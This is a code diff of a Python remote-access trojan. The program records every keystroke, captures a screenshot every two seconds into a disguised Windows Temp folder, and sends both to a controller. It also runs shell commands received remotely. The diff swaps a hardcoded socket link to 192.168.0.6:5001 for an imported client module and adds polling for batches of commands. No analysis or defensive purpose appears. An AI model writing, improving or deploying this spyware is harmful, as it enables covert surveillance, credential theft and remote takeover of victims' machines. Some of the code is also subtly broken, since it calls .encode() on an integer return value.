@@ -1,45 +1,19 @@
 import os
 import pyautogui
-import socket
 from threading import Thread
 import struct
 from pynput import keyboard
 import time
-
 os.makedirs(r"C:\Windows\Temp\Optimize", exist_ok=True)
-HOST = "192.168.0.6"
-PORT = 5001
-while True:
-    try:
-        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.connect((HOST, PORT))
-        print("Connected!")
-        client.sendall(b"hello")   # <-- IMPORTANT
-        break
-    except Exception as e:
-        print("Retrying:", e)
-        time.sleep(1)  # <-- CRITICAL
-def restart():
-    while True:
-        try:
-            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.connect((HOST, PORT))
-            print("Connected!")
-            client.sendall(b"hello")   # <-- IMPORTANT
-            time.sleep(2)
-            break
-        except Exception as e:
-            print("Retrying:", e)
-            time.sleep(1)
+import client
+
 def on_press(key):
     try:
         print(f'Key pressed: {key.char}')
-        client.sendall(b"key," + str(key).encode("utf-8"))
+        client.senda(b"key," + str(key).encode("utf-8"))
     except AttributeError:
         print(f'Special key pressed: {key}')
-        client.sendall(b"key," + str(key).encode("utf-8"))
-    except:
-        restart()
+        client.senda(b"key," + str(key).encode("utf-8"))
 
 def on_release(key):
     pass
@@ -65,43 +39,40 @@ def listen():
         listener.join()
 def take_screenshot():
     while True:
-        try:
-            path = r"C:\Windows\Temp\Optimize\temp.jpg"
-            print("Taking screenshot...")
-            pyautogui.screenshot(path)
-            with open(path, "rb") as f:
-                data = f.read()
-            client.sendall(b"img," + struct.pack("!I", len(data)))
-            client.sendall(data)
-        except Exception as e:
-            print("Error:", e)
-            restart()
+        path = r"C:\Windows\Temp\Optimize\temp.jpg"
+        print("Taking screenshot...")
+        pyautogui.screenshot(path)
+        with open(path, "rb") as f:
+            data = f.read()
+        client.senda(b"img," + struct.pack("!I", len(data)) + data)
         time.sleep(2)
 def receive_commands():
     while True:
         try:
-            data = client.recv(1024)
-            if not data:
-                break
+            time.sleep(1)
 
-            command = data.decode().strip()
-            print("Received:", command)
+            data = client.recv()
+            if not data or "commands" not in data:
+                continue
 
-            if command.startswith("cmd "):
-                output = os.popen(command[4:]).read()
-                client.sendall(output.encode())
-                print(output)
+            commands = list(data["commands"])
+            new_commands = []
+
+            for command in commands:
+                if command.startswith("cmd "):
+                    output = os.system(command[4:])
+                    client.sendall(output.encode())
+                    print(output)
+                else:
+                    new_commands.append(command)
+
+            client.update(new_commands)
 
         except Exception as e:
             print("Error receiving:", e)
             break
-def run_command(command):
-    os.system(command)
-try:
-    Thread(target=take_screenshot, daemon=True).start()
-    Thread(target=receive_commands, daemon=True).start()
-    Thread(target=listen, daemon=True).start()
-    while True:
-        time.sleep(1)
-except:
-    restart()
+Thread(target=take_screenshot, daemon=True).start()
+Thread(target=receive_commands, daemon=True).start()
+Thread(target=listen, daemon=True).start()
+while True:
+    time.sleep(1)
